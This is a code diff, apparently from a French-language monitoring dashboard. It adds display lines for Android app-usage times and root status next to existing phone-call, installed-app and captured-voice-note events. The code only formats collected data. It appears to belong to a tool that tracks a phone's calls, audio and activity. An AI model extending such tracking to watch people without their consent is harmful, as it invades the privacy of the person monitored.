@@ -196,6 +196,12 @@ function eventDetail(e){
   if(e.type==='app_focus')return`📱 ${esc(readableAppName(p.app))}`;
   // Android : apps installées
   if(e.type==='apps_installed')return`${p.count||0} apps installées`;
+  // Android : usage des apps
+  if(e.type==='app_usage'){
+    if(!p.apps||!p.apps.length)return`${p.count||0} apps utilisées`;
+    const topApps=p.apps.slice(0,3).map(a=>`<strong>${esc(a.appName||readableAppName(a.packageName))}</strong> (${a.minutesUsed||0}min)`).join(', ');
+    return`📊 ${p.count||p.apps.length} apps : ${topApps}${p.apps.length>3?' ...':''}`;
+  }
   // Appels téléphoniques
   if(e.type==='phone_call'){
     const typeIcons={entrant:'📲',sortant:'📱',manque:'❌',rejete:'🚫'};
@@ -205,6 +211,8 @@ function eventDetail(e){
     return`${icon} ${esc(p.type||'')} — ${name}${esc(p.number||'inconnu')}${dur}`;
   }
   if(e.type==='device_boot')return'Appareil redémarré';
+  // Android : statut root
+  if(e.type==='root_status')return`🔓 Root: ${p.isRooted?'<strong style="color:#22c55e">Actif</strong>':'Inactif'}${p.method?' ('+esc(p.method)+')':''}`;
   if(e.type==='voice_note_captured'){
     const dur=p.durationSeconds||p.durationEstimate||'?';
     const appName=esc(p.app||'');
